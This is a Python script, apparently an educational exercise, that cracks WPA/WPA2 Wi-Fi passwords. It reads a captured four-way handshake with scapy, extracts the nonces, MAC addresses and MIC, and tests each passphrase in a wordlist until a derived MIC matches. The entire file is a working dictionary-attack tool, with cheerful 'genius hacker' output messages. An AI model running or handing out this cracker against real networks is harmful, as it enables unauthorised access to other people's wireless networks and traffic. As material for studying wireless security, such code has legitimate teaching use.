from scapy.all import *
from typing import List, Any
from utils import *
import sys

if len(sys.argv) < 4:
    print("Usage of this script: `python3 crack.py <accesss point name> <path to handshake capture>")
    sys.exit(1)

access_point_essid = sys.argv[1]
path_to_handshake = sys.argv[2]
path_to_password_list = sys.argv[3]

all_packets = rdpcap(path_to_handshake)
first_packet = get_first_handshake_packet(all_packets)
second_packet = get_second_handshake_packet(all_packets)

access_point_mac = get_packet_sender_mac(first_packet)
access_point_mac_binary = format_mac_address_binary(access_point_mac)
client_mac = get_packet_receiver_mac(first_packet)
client_mac_binary = format_mac_address_binary(client_mac)

version = get_version(second_packet)
packet_type = get_type(second_packet)
length = get_length(second_packet)
a_nonce = get_nonce(first_packet)
s_nonce = get_nonce(second_packet)
mic = get_mic(second_packet)
eapol_key_layer = get_eapol_key_layer(second_packet)

all_passwords = read_password_list(path_to_password_list)

for password in all_passwords:
    # in our set up the pmk = psk
    pmk = derive_psk(password, access_point_essid)
    key_data = format_key_data(access_point_mac_binary, client_mac_binary, a_nonce, s_nonce)
    ptk = generate_ptk(pmk, key_data)

    # generate mic
    payload = format_payload(version, packet_type, length, eapol_key_layer)
    generated_mic = generate_mic(ptk, payload)

    if mic == generated_mic:
        print("!!!! Password cracked!!!!")
        print("You are a true genius hacker! ;)")
        print("The very top secret password is: ", password)
        sys.exit()

print("Password not found, you need to try a bit harder ;)")
